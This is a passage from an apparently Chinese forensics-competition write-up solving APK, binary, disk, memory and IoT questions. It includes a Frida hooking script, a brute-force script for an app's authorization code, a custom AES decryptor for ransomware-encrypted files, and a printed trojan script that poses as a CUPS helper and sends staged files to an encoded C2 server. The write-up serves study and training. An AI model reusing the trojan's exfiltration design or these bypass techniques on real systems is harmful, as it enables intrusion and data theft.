+const MultiLayerEncryptionClass = Java.use("net.net.crypto.MultiLayerEncryption");
+const encryptedPath = MultiLayerEncryptionClass.multiLayerEncrypt("check_apk_status");
+log(`[+] 主动调用获取加密路径: ${encryptedPath}`);
+capturedValues.encryptedPath = encryptedPath;
+// 2. 获取并调用 MainActivity.getVer (关键：主动调用！)
+const appVer = MainActivityClass.getVer();
+log(`[+] 主动调用获取应用版本 (ver): ${appVer}`);
+capturedValues.appVer = appVer;
+// 3. 直接读取 MainActivity 的静态字段
+const apkHash = MainActivityClass.apkHash.value;
+const timestamp = MainActivityClass.ts.value;
+if (apkHash && apkHash !== "") {
+log(`[+] 获取到 APK 哈希 (apkHash): ${apkHash}`);
+capturedValues.apkHash = apkHash;
+} else {
+error("获取 apkHash 失败，值为空或未初始化");
+}
+if (timestamp && timestamp !== "") {
+log(`[+] 获取到时间戳 (ts): ${timestamp}`);
+capturedValues.timestamp = timestamp;
+} else {
+error("获取 ts 失败，值为空或未初始化");
+}
+// 4. 尝试生成最终的 URL
+generateAndPrintURL();
+} catch (e) {
+error(`主动调用关键方法时出错: ${e.message}`);
+error(`堆栈: ${e.stack || '无堆栈信息'}`);
+}
+});
+// ==================================================
+// =========== 保留原有的 Hook 作为备用 (可选) ===========
+// Hook getVer，以防主动调用失败，后续还有机会捕获
+try {
+MainActivityClass.getVer.implementation = function () {
+const ver = this.getVer();
+if (capturedValues.appVer === null) {
+log(`[+] Hook 捕获到应用版本 (ver): ${ver}`);
+capturedValues.appVer = ver;
+generateAndPrintURL();
+}
+return ver;
+};
+log("[*
+] 已设置 MainActivity.getVer 的 Hook (备用)");
+} catch (e) {
+log("[*] 设置 getVer Hook 失败，但已主动调用，无影响");
+}
+// Hook onCreate 作为应用启动的标志
+try {
+MainActivityClass.onCreate.implementation = function (bundle) {
+log("[*] MainActivity.onCreate 被调用，主界面已创建");
+return this.onCreate(bundle);
+};
+log("[*] 已 Hook MainActivity.onCreate");
+} catch (e) {
+error(`Hook onCreate 失败: ${e.message}`);
+}
+// 注意：我们不再需要 startPollingFields 函数，因为已经主动获取了
+});
+// 2. 等待 MultiLayerEncryption 加载 (主要用于 Hook，但主动调用已足够)
+waitForClass("net.net.crypto.MultiLayerEncryption", function (MultiLayerEncryptionClass) {
+log("✅ 类 net.net.crypto.MultiLayerEncryption 已加载");
+// 可选：保留 Hook 以观察后续调用
+try {
+MultiLayerEncryptionClass.multiLayerEncrypt.implementation = function (input) {
+const result = this.multiLayerEncrypt(input);
+if (input === "check_apk_status") {
+log(`[+] Hook 捕获到加密路径: ${result}`);
+if (capturedValues.encryptedPath === null) {
+capturedValues.encryptedPath = result;
+generateAndPrintURL();
+}
+}
+return result;
+};
+log("[*] 已 Hook MultiLayerEncryption.multiLayerEncrypt (备用)");
+} catch (e) {
+error(`Hook multiLayerEncrypt 失败: ${e.message}`);
+}
+});
+});
+// =============== 脚本结束 ===============
+导入雷电，开始跑
+所以这一题的答案是4.56.23
+34、apk运行后需要通过一个http get请求才能打开第二个界面，给出该请求URL？ （答案格式：
+[http://www.xxx.com/test?a=1]
+）（ ）
+脚本如上题
+http://localhost:60723/K0pQvBZ38ykL26OzfshqYTHC2f7RUJYIgrmIF6GcORU=?hash=983f8a605d16530190c09b0884d7cef1&ver=4.56.23&ts=1727899789
+35、apk第二界面的8位授权码是什么？ （答案格式：11111111）（ ）
+代码发现授权码是静态验证，用的还是Java 的
+<font style="background-color:rgb(243, 244, 244);">String.hashCode()</font>
+算法
+所以这玩意其实是静态的
+我们直接写脚本爆破就好了
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+import time
+from concurrent.futures import ThreadPoolExecutor
+def java
+_string_
+hashcode(s):
+"""
+模拟Java String的hashCode算法[6](@ref)
+"""
+h = 0
+for char in s:
+h = (31 * h + ord(char)) & 0xFFFFFFFF  # 使用& 0xFFFFFFFF来模拟Java int的32位溢出
+# 将无符号32位整数转换为有符号32位整数
+return h if h < 0x80000000 else h - 0x100000000
+def crack
+_authorization_
+code
+_java_
+hash():
+target_hash = -711638849
+print("使用Java hashCode算法重新破解...")
+print(f"目标哈希值: {target_hash}")
+start_time = time.time()
+found = False
+# 遍历所有8位数字组合
+for num in range(100000000):
+candidate = f"{num:08d}"  # 格式化为8位数
+# 使用Java风格的哈希算法
+current_hash = java_string_hashcode(candidate)
+if current_hash == target_hash:
+end_time = time.time()
+print(f"\n✅ 破解成功！")
+print(f"明文授权码是: {candidate}")
+print(f"验证哈希值: {current_hash}")
+print(f"耗时: {end_time - start_time:.2f} 秒")
+found = True
+break
+# 每100万次输出一次进度
+if num % 1000000 == 0 and num > 0:
+print(f"已尝试 {num} 个组合...")
+if not found:
+print("❌ 未找到匹配的授权码。请检查目标哈希值或考虑其他可能性。")
+# 测试一下算法是否正确实现
+def test
+_hash_
+algorithm():
+"""测试Java哈希算法实现是否正确"""
+test_cases = ["12345678", "00000000", "11111111"]
+print("测试哈希算法:")
+for test in test_cases:
+java_hash = java_string_hashcode(test)
+print(f"字符串 '{test}' 的Java风格哈希值: {java_hash}")
+if
+__name__
+== "
+__main__
+":
+# 先测试算法
+test_hash_algorithm()
+print("\n" + "="*50)
+# 开始正式破解
+crack_authorization_code_java_hash()
+成功破解，授权码为84572399
+四、二进制程序分析
+这边纯就是被平航杯吓怕了，而且这个比赛也是反复在计算机强调不要在本机运行，所以现在怂怂的不敢运行了
+但是这边如果我们运行会简单很多，以防万一，我们去计算机的虚拟机跑（嘻嘻还是怕）
+36、安装该程序后，该恶意程序的可执行文件所在的直接父目录名称是什么为？（答案格式：root）（ ）
+会发现在安装软件
+我们先装一下
+直接下桌面了
+然后打开文件所在位置，我们就会发现这玩意的父目录一眼就能看出来，是proxy
+37、解密文件名为RnRGaWxlcy5lZGIiL的文件时所使用的key是什么？（答案格式：请按实际值填写）（ ）
+先die，放到64位ida
+定位到main函数位置
+这边我们可以看到在打开这个R开头的文件
+检索一番之后可以确定解密的函数在sub_140001BF0中
+就是在拿这个进行解密
+而这个的值为1Njc2NTQ2Mzc0NTc
+（网上有认为a开头这个是key的，我认为key更应该是值吧，更该是1Njc2NTQ2Mzc0NTc）
+38、解密文件RnRGaWxlcy5lZGIiL成功后，请分析并给出解密后的文件的入口点地址？（答案格式：0x180000000）（ ）
+得先把这个东西给解密了
+在ida里可以看到有大量256
+基本可以判断是rc4解密
+直接bake了
+然后保存扔到die看看
+这边直接跳出来了入口点
+0000000180002730
+0x180002730
+39、加密文件名为6c051a72b91a1的文件时所使用的密钥是多少？（答案格式：请按实际值填写）（ ）
+跟37差不多，需要我们分析一下
+首先分析内存加载文件
+可以看到最后是调用的SDGHY3a9DK3t14Fg1hSGH56U函数
+但是在这个里边似乎是没有这个函数的
+这边注意到上一题解密的文件是一个.dll文件
+打开来后发现这边存在SDGHY3a9DK3t14Fg1hSGH56U函数
+上边在获取Downloads目录下的文件
+下边sub_180001D80(“跳过目录: %s\n”, v6);就是对这个开始加密
+步进sub_180001D80函数，会发现这玩意会让文件变成.1文件，就像我们现在在解密的这个一样
+所以加密程序一定就在这
+继续往下看，分析一段时间之后可以发现这三个分别是key，key拓展和iv
+所以key就是这个，但是是小端序
+应该是cgDSb6VOegeF7EuW
+40、6c051a72b91a1.1文件解密后的md5值后六位是多少？（字母全大写，答案格式：AAAAAA）（ ）
+找到key，iv和key拓展之后就可以着手写解密程序了
+是一个不标准的aes加密
+它最终会将扩展后的密钥进行位置交换。
+第n次加密就将w[0] 和 w[n] 进行交换。
+每11次是一次小循环，每（4096/ 16） 次是一次大循环。
+只加密满16字节的数据，不足16字节不加密。
+（是我们Jerryxie喜欢的密码学环节）
+最后写得脚本（我改了一点）
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+#!/usr/bin/env python3
+# -
+*- coding: utf-8 -*
+-
+# AES-128 implementation + CBC mode (PKCS#7 padding)
+# Only pure Python, no external libs.
+SBOX = [
+0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
+0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
+0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
+0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
+0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
+0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
+0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
+0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
+0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
+0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
+0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
+0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
+0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
+0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
+0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
+0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
+]
+INV
+_SBOX = [0]*256
+for i,v in enumerate(SBOX):
+INV_
+SBOX[v] = i
+RCON = [0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1B,0x36]
+def xtime(a):
+return ((a<<1) & 0xFF) ^ (0x1B if (a & 0x80) else 0x00)
+def mul(a,b):
+# multiply in GF(2^8)
+res = 0
+for i in range(8):
+if b & 1:
+res ^= a
+carry = a & 0x80
+a = ((a<<1) & 0xff)
+if carry:
+a ^= 0x1b
+b >>= 1
+return res
+def sub
+_word(word4):
+return bytes([SBOX[b] for b in word4])
+def rot_
+word(word4):
+return word4[1:4] + word4[0:1]
+def key
+_expansion(key16, n=0):
+# key16: bytes(16)
+assert len(key16) == 16
+Nk = 4
+Nb = 4
+Nr = 10
+# words: 4-byte words
+w = [key16[i:i+4] for i in range(0, 16, 4)]
+for i in range(Nk, Nb*(Nr+1)):
+temp = w[i-1]
+if i % Nk == 0:
+temp = bytes(a ^ b for a,b in zip(sub_
+word(rot
+_word(temp)), bytes([RCON[i//Nk],0,0,0])))
+w.append(bytes(a ^ b for a,b in zip(w[i-Nk], temp)))
+round_
+keys = [b''.join(w[4
+*i:4*
+i+4]) for i in range(Nr+1)]
+# Swap round keys if n is specified and valid
+if n != 0 and n < len(round_keys):
+ss = round_keys[n]
+round_keys[n] = round_keys[0]
+round_keys[0] = ss
+return round_keys  # list of 11 round keys (16 bytes each)
+def add
+_round_
+key(state, round
+_key):
+# state: list of 16 ints; round_
+key: bytes(16)
+return [s ^ round_key[i] for i,s in enumerate(state)]
+def sub
+_bytes(state):
+return [SBOX[b] for b in state]
+def inv_
+sub
+_bytes(state):
+return [INV_
+SBOX[b] for b in state]
+def shift
+_rows(state):
+# state is 16 bytes in column-major (state[c*4 + r])
+out = [0]*16
+for r in range(4):
+for c in range(4):
+out[c*4 + r] = state[((c + r) % 4)*4 + r]
+return out
+def inv_
+shift
+_rows(state):
+out = [0]*16
+for r in range(4):
+for c in range(4):
+out[c*4 + r] = state[((c - r) % 4)*4 + r]
+return out
+def mix_
+single
+_column(a):
+# a: 4 bytes list
+r = [0,0,0,0]
+r[0] = mul(a[0],2) ^ mul(a[1],3) ^ a[2] ^ a[3]
+r[1] = a[0] ^ mul(a[1],2) ^ mul(a[2],3) ^ a[3]
+r[2] = a[0] ^ a[1] ^ mul(a[2],2) ^ mul(a[3],3)
+r[3] = mul(a[0],3) ^ a[1] ^ a[2] ^ mul(a[3],2)
+return r
+def mix_
+columns(state):
+out = [0]*16
+for c in range(4):
+col = [state[c*4 + r] for r in range(4)]
+mixed = mix_single_column(col)
+for r in range(4):
+out[c*4 + r] = mixed[r]
+return out
+def inv
+_mix_
+columns(state):
+out = [0]*16
+for c in range(4):
+a = [state[c*4 + r] for r in range(4)]
+out[c*4 + 0] = mul(a[0],0x0e) ^ mul(a[1],0x0b) ^ mul(a[2],0x0d) ^ mul(a[3],0x09)
+out[c*4 + 1] = mul(a[0],0x09) ^ mul(a[1],0x0e) ^ mul(a[2],0x0b) ^ mul(a[3],0x0d)
+out[c*4 + 2] = mul(a[0],0x0d) ^ mul(a[1],0x09) ^ mul(a[2],0x0e) ^ mul(a[3],0x0b)
+out[c*4 + 3] = mul(a[0],0x0b) ^ mul(a[1],0x0d) ^ mul(a[2],0x09) ^ mul(a[3],0x0e)
+return out
+def encrypt
+_block(block16, round_
+keys):
+assert len(block16) == 16
+state = list(block16)
+state = add_round_key(state, round_keys[0])
+for rnd in range(1, 10):
+state = sub_bytes(state)
+state = shift_rows(state)
+state = mix_columns(state)
+state = add_round_key(state, round_keys[rnd])
+# final round
+state = sub_bytes(state)
+state = shift_rows(state)
+state = add_round_key(state, round_keys[10])
+return bytes(state)
+def decrypt
+_block(block16, round_
+keys):
+assert len(block16) == 16
+state = list(block16)
+state = add_round_key(state, round_keys[10])
+state = inv_shift_rows(state)
+state = inv_sub_bytes(state)
+for rnd in range(9, 0, -1):
+state = add_round_key(state, round_keys[rnd])
+state = inv_mix_columns(state)
+state = inv_shift_rows(state)
+state = inv_sub_bytes(state)
+state = add_round_key(state, round_keys[0])
+return bytes(state)
+# CBC mode
+def aes
+_cbc_
+encrypt(plaintext, key16, iv16):
+assert len(iv16) == 16
+round_keys = key_expansion(key16)
+# No padding for this specific use case
+blocks = [plaintext[i:i+16] for i in range(0, len(plaintext), 16)]
+cipher = b''
+prev = iv16
+for blk in blocks:
+xored = bytes(a ^ b for a,b in zip(blk, prev))
+enc = encrypt_block(xored, round_keys)
+cipher += enc
+prev = enc
+return cipher
+def aes
+_cbc_
+decrypt(ciphertext, key16, iv16, j=0):
+assert len(iv16) == 16
+if len(ciphertext) % 16 != 0:
+raise ValueError("Ciphertext length must be multiple of 16")
+round_keys = key_expansion(key16, j)
+blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
+plain = b''
+prev = iv16
+for blk in blocks:
+dec = decrypt_block(blk, round_keys)
+xored = bytes(a ^ b for a,b in zip(dec, prev))
+plain += xored
+prev = blk
+return plain
+# Utilities for hex
+def hex
+_to_
+bytes(h):
+h = h.replace(' ','').replace('\n','')
+if len(h) % 2:
+h = '0' + h
+return bytes.fromhex(h)
+def bytes
+_to_
+hex(b):
+return b.hex()
+# Example / Test vectors
+if
+__name__
+== "
+__main__
+":
+# AES-128 single-block test (ECB): from NIST SP 800-38A
+key = hex_to_bytes("636744536236564f6567654637457557")
+# CBC example:
+iv = hex_to_bytes("672394ef4cd52f76ffde7bb06a86625c")
+# decrypt
+f = open("6c051a72b91a1.1", "rb")
+ff = open("6c051a72b91a1.png", "wb")
+j = 0
+# Read the entire file first
+ciphertext = f.read()
+f.close()
+# Process in blocks
+for i in range(0, len(ciphertext), 16):
+block = ciphertext[i:i+16]
+if len(block) < 16:
+# Last partial block, write as-is
+ff.write(block)
+else:
+# Decrypt full block
+p = aes_cbc_decrypt(block, key, iv, j % 11)
+ff.write(p)
+j += 1
+if j == 256:
+j = 0
+ff.close()
+print("Decryption completed. Check 6c051a72b91a1.png")
+恢复完成！是一张png
+最后计算出md5后六位为FF74E8
+五、计算机取证分析
+41、操作系统的Build版本号是？（答案格式：1）（
+经典火眼一把梭，直接能看出来就是19044
+符合格式的话是19044，不然全部的话就是19044.1381
+我只能说说的不清楚
+42、操作系统设置的账户密码最长存留期为多少天？（答案格式：1）（
+这个正好在2024数证初赛也考过啊
+仿真之后运行 secpol.msc打开本地安全策略即可
+68天嗷
+43、用户2登陆密码NT哈希值后六位是？（字母全大写，答案格式：AAAAAA）（ ）
+用户2就点到用户2
+这边可以看到NT HASH
+后六位就是A9C708（注意大写）
+44、蓝牙mac地址是多少？（答案格式：AA-AA-AA-AA-AA-AA）（ ）
+去网络配置里看
+锁定Bluetooth
+然后直接写MAC地址就是了9C-B6-D0-04-C9-CC
+45、SafeImager的产品序列号后四位是？（字母全大写，答案格式：AAAAAA）（ ）
+在USB设备信息可以找到
+序列号就在下边
+所以是09C4
+46、123.VHD所处的结束扇区是？（答案格式：1 ）（ ）
+还是很好定位到这边的
+我们可以先在火眼找到结尾的十六进制
+然后将最后的十六进制塞到winhex里看看
+于是我们定位到了27445248的位置
+因为文件系统中文件以簇(4096 字节)为单位分配空间，所以
+我们将刚才得到的扇区补充上 7 个扇区，得到 27445248+7=27445255
+是为了得到簇对齐，所以加了7
+答案就是27445255了
+47、用户在BitLocker加密分区最后修改的文件是?（答案格式：abcd.txt）（ ）
+BitLocker加密的就是D盘
+我们双击刚刚的123.vhd后
+可以在里边找到这样子一个恢复密钥，有了这个我们就能打开这个bitlocker了
+打开之后会看到最后修改的就是这个资料1.txt
+48、用户连接192.168.114.129时用的会话名称是？（答案格式：按照实际情况填写）（ ）
+这个ip很容易发现就在Xshell里
+就连连接名称都直接显示了
+”连接阿里云“
+49、用户创建存储虚拟币钱包地址页面的时间是？（使用双位数格式，答案格式：01月01日）（ ）
+在桌面可以看到有个Anytype
+是个笔记软件，那很关键了，我们打开看看
+打开来有个加密的
+3HrdpWM8ZrBVw9yu8jx1RoNNK6BZxwsHd9
+查一下会发现这是个虚拟币钱包
+那就确定是这个了，看看版本历史就能看到本题答案，10月07日
+50、用户的虚拟币钱包地址是？（答案格式：按照实际情况填写）（ ）
+49我就是先找到的地址才能确认的钱包，所以我们也确定了地址就是这个
+3HrdpWM8ZrBVw9yu8jx1RoNNK6BZxwsHd9
+51、用户VC加密容器的密码是？（答案格式：按照实际情况填写）（ ）
+这一题需要先做57回头才知道
+在57中我们找到了一个联系人.docx
+然而打开后发现最后有许许多多的诡异回车
+全选改字体颜色后发现了VC密码
+SHUZHENGBEIctzy2025
+这就是本题的答案了
+至于vc容器也很容易找到
+就是123.vdh里边的这个secretNew
+成功解开，也验证了答案就是这个
+SHUZHENGBEIctzy2025
+52、用户在生活中使用的代号是？（答案格式：按照实际情况填写）（ ）
+我们在桌面可以看到这样子一个wav文件，文件名就叫代号
+声音乱的要死啊，怀疑就是音频隐写，桌面上还有个Au
+直接扔进去看看
+右键后选择多视图
+然后就看出来了
+代号：小胖
+53、李安东的银行卡归属哪个银行？（答案格式：农业银行）（ ）
+在刚刚解密的D盘里可以看到银行卡卡密.txt
+在桌面我们也能找到这样子一个对应的文件，明显是爆破，6位数字爆的很快
+就是688561
+打开看看
+直接就告诉我们了，数据量也不大
+如果想刁难的话其实可以再套几层数据加密，然后再整个几千条大数据
+是交通银行
+54、请分析某市10月6日最高气温是？（答案格式：1）（ ）
+依旧在桌面的公司资料文件夹里可以看到气温加密.zip
+发现里边关于气温的加密了，我们尝试解密
+我说真的，我们还有这个班级统计表.xls，难道不像是明文爆破吗？？？？
+但这边只是伪加密，真的是意义不明，气死我了
+要我说以后不管什么全都先随波逐流一波（甚至这题要扔到随波逐流修复两次，这特么啥啊）
+最高温度21
+55、用户的BitLocker密码是？（答案格式：按照实际情况填写）（ ）
+其实在46的时候双击123.vdh就能找到了
+625075-617309-532576-720302-040975-309232-451924-426679
+其实根本就不是上边那个！！！上边那个是恢复密钥，但是问的是密码！
+审题这一块
+这边注意到下载里边有个用来隐写的压缩包
+我们本地看一下
+很明显需要我们填入一个图片
+在邮箱中我们可以看到这样子一个附件
+我们提取出来扔进去
+可以看到解密出来了明文
+也就是本题答案SZBJSJTM2025
+只是似乎没有题目需要填写这个（可以再搞个BitLocker，顺便和前边的区分开，搞混淆项嘻嘻）
+56、用户办公室的门禁密码是？（答案格式：按照实际情况填写）（ ）
+这一题需要解开51和57才能做，因此推荐先看这俩
+在57合并压缩包，在51打开VC密码
+在打开VC加密容器后我们找到了这个办公室密码锁
+是一个加密文件，而57正好是个解密程序
+解密一下
+我看见了故人的影子（指盘古石）
+长成这样子，但是没显示答案
+我们看看十六进制可以看到文件尾之后还有信息
+所以答案是147963258（有没有可能还要根据这个数字去按那个密码锁，然后最后是295676197）
+57、用户使用的以D开头的解密程序的MD5值后六位是？（字母全大写，答案格式：AAAAAA）（ ）
+在55题看邮件的时候会发现还有三个软件分包
+copy /B 软件.part1.rar+软件.part2.rar+软件.part3.rar
+直接合起来
+可以看到这个就是D开头的解密程序，我们直接解压然后看看MD5值即可
+但是这边发现还是不完整，猜测是不止分了三块
+根据格式搜索一下
+就会发现还有4和5，散落在角落
+copy /B 软件.part1.rar+软件.part2.rar+软件.part3.rar+软件.part4.rar+软件.part5.rar
+现在合成完之后就好了，还多了一个联系人.docx
+这边接的是51题，而解密程序是用于56-57题
+我们算一下md5
+后六位是3A892E
+58、木马程序运行至系统断点前加载了几个动态链接库？（答案格式：1）（ ）
+木马程序还是很好找到的，就是桌面这个
+我们扔到云沙箱看一眼
+一共3个动态链接库
+59、木马产生的程序名称是什么？（答案格式：abcd.txt）（ ）
+云沙箱里自动分析了，就是这个wins.exe
+60、木马尝试访问的域名是什么？（答案格式：按照实际情况填写）（ ）
+依旧云沙箱一把梭
+这边可以看到域名就是这个edu-image.nosdn.127.net
+61、分析计算机内存检材，此内存镜像制作时的系统时间是？（使用双位数格式，答案格式：01月01日）（ ）
+这边开始往后全是内存取证题，我们这边是使用的lovelymem做的
+打开加载一下
+第一题问制作时间，直接点击看看系统信息就好了
+是10月16日
+62、分析计算机内存检材，用户Yiyelin的用户表示后4位是？（答案格式：1111）（ ）
+还是在lovelymem系统信息一栏
+】
+后4位就是1002
+63、分析计算机内存检材，计算机的CPU型号是什么？（答案格式： i9-1110U）（ ）
+还是在lovelymem系统信息一栏，直接就看出来了
+i7-1165G7
+64、分析计算机内存检材，wps.exe的PID是？（答案格式：1）（ ）
+问PID，当然得看看进程信息啦
+就是5888
+65、分析计算机内存检材，此计算机开机自启动的远控软件名称是？（答案格式：abcd.txt）（ ）
+我们定位AUTO_START一列
+然后就能找到这个远控软件
+SunloginService
+继续翻可以看到名称
+“C:\Program Files\Oray\SunLogin\SunloginClient\SunloginClient.exe” –mod=service
+所以是SunloginClient.exe
+六、物联网设备取证分析
+这物联网就是个linux系统的CUPS打印机
+66、打印机的主机名称是什么？(答案格式：root)（ ）
+可以看到主机名就是print
+67、打印文件存储在哪个目录？(答案格式：/root/root)（ ）
+一开始毫无思路，只能先询问一下ai
+这边显示我们可以检查相关配置文件或者去看看系统默认的假脱机目录
+https://blog.csdn.net/Mr_Ohahah/article/details/111423100
+这边对于假脱机打印机正好有一个介绍
+所以我们基本锁定去
+/etc/cups/cupsd.conf
+/var/spool/cups
+看看情况
+然而我们在/etc/cups/cupsd.conf寻找一番会发现没什么东西
+但这边我们在同目录/etc/cups/cups-files.conf却看见了下边的内容
+明确显示了打印请求和假脱机文件目录就是/var/spool/cups
+这边只能在这个/etc/cups/cups-files.conf找到答案，因为你去/var/spool/cups会发现全都是空的
+这其实主要是因为机器没启动，所以假脱机目录是空的，其实是正常的，但是你就无法确定说这个绝对就是答案
+还是要找到/etc/cups/cups-files.conf才能确定
+当然了，在比赛里如果实在是找不到，找一找或者直接写默认存储目录也蛮好的，我是觉得比空着好
+68、同一天，打印两份文件的用户是谁？(答案格式：root)（ ）
+想知道同一天打印两份的用户
+肯定是查一下日志哇
+去/var/log/cups路径看看
+询问ai后得知
+我们应该查询的是page_log，这会记载打印作业的记载者
+这个日志也是非常简洁啊，一个bob一个alice
+很明显是alice打印了两份
+69、分析物联网检材，木马运行后，自身产生的进程ID是多少？（答案格式：1）（ ）
+在做这题前，至少我们该知道木马在哪，长什么样
+我们可以先使用sudo ss -tunap查看一下网络监听情况（虚拟机是可以搭起来的，虽然是arm架构，但是是可以搭起来的）
+然而我们什么都没能找到
+因此动态似乎不行，木马似乎在休眠期，我们尝试静态搜索
+根据ai一步步走就好，由于70题在那边问执行周期，所以我们可以先去那边看看，因为木马很有可能就是一个非标定时任务
+我们知道格式应该是
+*/x * * * *
+寻找一下
+可以看到有一个healthcheck
+因为这个是完全非标准的名称情况
+在这边我们看到了70题的答案，而这个/usr/local/bin/cups-helper也被列为重点木马可疑对象，它故意改名为了cups-healper，就是试图伪装成与打印服务（CUPS）相关的合法程序
+是个python程序
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+#!/usr/bin/python3
+# -
+*- coding: utf-8 -*
+-
+# A helper script to manage CUPS spooling and perform health checks.
+# Do not modify unless you are an authorized technician.
+# KVJEYIHHXSLOPIEBEAWT4ICCMFZWKNRUEDT3ZFXHUCASALJ6EDS23F7HVSTOJOFS4WHY32F5VQ======
+import os
+import shutil
+import socket
+import datetime
+import re
+# --- Configuration ---
+# C2 server for uploading diagnostic data
+C2
+_SERVER = "zUTMugDMx4SO5EjL1gTM"
+C2_
+PORT = "zQDN"
+# Spool directory to monitor
+SPOOL
+_DIR = "GJTJzBXdjZkMlw2bvB3cGJTJyFmdGJTJ"
+# Define staging directory for processing before exfiltration
+STAGING_
+DIR = "GJTJlh2YhNmLGJTJw1GdGJTJ"
+# Log file for upload activities
+LOG
+_FILE = "==wZvxmLkF2bsBXdGJTJlJXYoNnRyUCbhN2bs5iRyUCdv9mcGJTJ"
+# Keyword to identify sensitive documents for "special handling"
+WATCHED_
+KEYWORD = "=UmcpZmbvdWYyREMyUCdjVmavJHU"
+# --- End Configuration ---
+def log
+_message(message):
+"""Appends a timestamped message to the log file."""
+now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+full_
+message = f"[{now}] {message}\n"
+with open(LOG_FILE, 'a') as f:
+f.write(full_message)
+def scan
+_and_
+stage():
+"""(Simulated) Scans the spool directory and copies sensitive files to the staging area."""
+pass
+def exfiltrate
+_data():
+"""(Simulated) 'Uploads' files from the staging directory to the C2 server."""
+if not os.path.exists(STAGING_
+DIR):
+return
+staged_files = os.listdir(STAGING_DIR)
+if not staged_files:
+return
+try:
+# The system log entry shows this connection attempt.
+# This part of the script provides the "ground truth" for that log.
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(5)
+# sock.connect((C2_SERVER, C2_PORT))
+for filename in staged_files:
+log_message(f"SUCCESS: Uploaded {filename} to {C2_SERVER}")
+sock.close()
+except Exception as e:
+log_message(f"ERROR: Could not connect to C2 server: {e}")
+def main():
+scan_and_stage()
+exfiltrate_data()
+if
+__name__
+== "
+__main__
+":
+main()
+开头甚至还在演，说自己就是个合法合规的，完全没事的，别改
+至此我们也是找到了木马程序，尽管里边是一堆的加密文字
+但我们还是可以一眼看见
+这玩意要远程连到C2服务器上（这也就是第72的问题）
+火眼在系统日志很容易看见这个，毕竟就4条系统日志
